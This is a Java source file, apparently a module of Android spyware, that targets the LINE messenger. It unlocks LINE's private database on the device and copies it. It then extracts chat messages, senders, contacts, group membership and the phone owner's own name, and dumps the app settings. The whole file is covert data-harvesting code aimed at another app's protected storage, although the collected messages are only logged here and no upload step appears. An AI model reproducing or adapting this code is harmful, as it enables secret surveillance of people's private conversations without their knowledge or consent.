package com.android.networking.module.chat;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.Semaphore;

import android.content.ContentValues;
import android.database.Cursor;
import android.database.DatabaseUtils;
import android.database.sqlite.SQLiteDatabase;

import com.android.networking.auto.Cfg;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.db.RecordGroupsVisitor;
import com.android.networking.db.RecordHashPairVisitor;
import com.android.networking.db.RecordHashtableListVisitor;
import com.android.networking.db.RecordStringVisitor;
import com.android.networking.db.RecordVisitor;
import com.android.networking.file.Path;
import com.android.networking.util.Check;

public class ChatLine extends SubModuleChat {
	private static final String TAG = "ChatLine";

	private static final int PROGRAM = 0x01;
	String pObserving = "line";
	String dbFile = "/data/data/jp.naver.line.android/databases/naver_line";

	private Date lastTimestamp;

	private Hashtable<String, Long> lastLine;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	private String account = "local";
	private String account_mid= "mid";

	private GenericSqliteHelper helper;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		try {
			readLineMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}
	}

	@Override
	protected void start() {
		lastLine = markup.unserialize(new Hashtable<String, Long>());
		try {

			Path.unprotect(dbFile, 3, true);
			Path.unprotect(dbFile + "*", true);

			helper = GenericSqliteHelper.openCopy(dbFile);
			helper.deleteAtEnd = false;

			account = readMyPhoneNumber();
			// if (account != null) {
			readLineMessageHistory();
			// }
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastSkype: " + lastLine);
		}
	}

	private String readMyPhoneNumber() {

		SQLiteDatabase db = helper.getReadableDatabase();

		RecordHashPairVisitor visitorContacts = new RecordHashPairVisitor("m_id", "name");
		helper.traverseRecords("contacts", visitorContacts);

		RecordStringVisitor visitorContent = new RecordStringVisitor("content");
		visitorContent.selection = "server_id is null";
		helper.traverseRecords("chat_history", visitorContent);

		for (String content : visitorContent.getRecords()) {
			if (Cfg.DEBUG) {
				String[] lines = content.split("\n");
				for (int i = 0; i < lines.length; i += 3) {
					String mid = lines[i + 1];
					String name = lines[i + 2];
					if (!visitorContacts.containsKey(mid)) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (readMyPhoneNumber) my name is: %s, mid: %s", name, mid);
							account = name;
							account_mid = mid;
						}
					}
				}

			}
		}

		return account;
	}

	private String readSettings() {
		SQLiteDatabase db = helper.getReadableDatabase();

		Cursor c = db.query("setting", null, null, null, null, null, null);

		ArrayList<ContentValues> retVal = new ArrayList<ContentValues>();
		ContentValues map;
		if (c.moveToFirst()) {
			do {
				map = new ContentValues();
				DatabaseUtils.cursorRowToContentValues(c, map);
				retVal.add(map);
				String key = map.getAsString("key");
				String value = map.getAsString("value");

				com.android.utils.ReverseLogging.d(key, " -> ", value);
			} while (c.moveToNext());
		}

		c.close();
		db.close();
		return "";
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private void readLineMessageHistory() throws IOException {

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readViberMessageHistory), semaphore red");
			}
			return;
		}

		try {
			Path.unprotect(dbFile, 3, true);
			Path.unprotect(dbFile + "*", true);

			// GenericSqliteHelper helper =
			// GenericSqliteHelper.openCopy(dbFile);
			// helper.deleteAtEnd = false;
			final ChatGroups groups = getLineGroups(helper);

			String sqlquery = "select chat_id, from_mid, content, ch.created_time, sent_count , name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where type=1 order by ch.created_time ";
			String[] projection = new String[] { "chat_id", "from_mid", "content", "ch.created_time", "sent_count",
					"name" };

			RecordVisitor visitor = new RecordVisitor(null, null) {
				@Override
				public long cursor(Cursor cursor) {
					String chat_id = cursor.getString(0);
					String from_mid = cursor.getString(1);
					String content = cursor.getString(2);
					long created_time = cursor.getLong(3);
					Date date = new Date(created_time);

					int sent_count = cursor.getInt(4);
					String from = cursor.getString(5);
					if (from == null)
						from = account;

					String to = groups.getGroupTo(from, chat_id);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (readLineMessageHistory) %s: %s,%s -> %s ", date.toLocaleString(), from, to,
								content);
					}
					return created_time;
				}
			};

			helper.deleteAtEnd = true;
			helper.traverseRawQuery(sqlquery, null, visitor);
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				
				Check.log(TAG + " (readLineMessageHistory) Error: ", ex);
			}
		} finally {
			readChatSemaphore.release();
		}

	}

	private ChatGroups getLineGroups(GenericSqliteHelper helper) {
		SQLiteDatabase db = helper.getReadableDatabase();
		final ChatGroups groups = new ChatGroups();
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				String key = cursor.getString(0);
				String mid = cursor.getString(1);
				String name = cursor.getString(2);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getLineGroups) %s: %s,%s", key, mid, name);
				}
				if (name == null) {
					groups.addPeerToGroup(key, mid);
				} else {
					groups.addPeerToGroup(key, name);
				}
				return 0;

			}
		};

		String sqlquery = "SELECT  chat_id, mid, name FROM 'chat_member' left join contacts on chat_member.mid = contacts.m_id";
		helper.traverseRawQuery(sqlquery, null, visitor);

		groups.addLocalToAllGroups(account);
		if (Cfg.DEBUG) {
			for(String group: groups.getAllGroups()){
				String to = groups.getGroupTo(account, group);
				Check.log(TAG + " (getLineGroups) %s : %s", group, to);
			}
			
			
		}
		return groups;
	}

}
